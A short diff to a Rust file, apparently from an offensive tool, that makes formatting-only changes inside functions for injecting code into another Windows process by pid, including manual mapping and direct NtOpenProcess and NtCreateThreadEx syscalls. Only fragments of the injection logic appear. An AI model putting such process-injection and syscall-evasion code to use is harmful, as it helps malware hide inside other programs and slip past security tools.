@@ -90,8 +90,8 @@ pub(crate) fn nt_create_thread_inject(
     label: &str,
 ) -> anyhow::Result<()> {
     const SYNCHRONIZE: u32 = 0x00100000;
-    use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ};
     use crate::win_types::PAGE_READWRITE;
+    use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ};
 
     // Minimal thread access for NtCreateThreadEx: SYNCHRONIZE only.
     // The handle is closed immediately after creation (fire-and-forget).
@@ -362,7 +362,8 @@ fn manual_map_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
             | windows_sys::Win32::System::Threading::PROCESS_VM_WRITE
             | windows_sys::Win32::System::Threading::PROCESS_VM_READ
             | windows_sys::Win32::System::Threading::PROCESS_CREATE_THREAD
-            | windows_sys::Win32::System::Threading::PROCESS_QUERY_INFORMATION) as u64;
+            | windows_sys::Win32::System::Threading::PROCESS_QUERY_INFORMATION)
+            as u64;
         let open_status = crate::syscall!(
             "NtOpenProcess",
             &mut h_proc as *mut _ as u64,
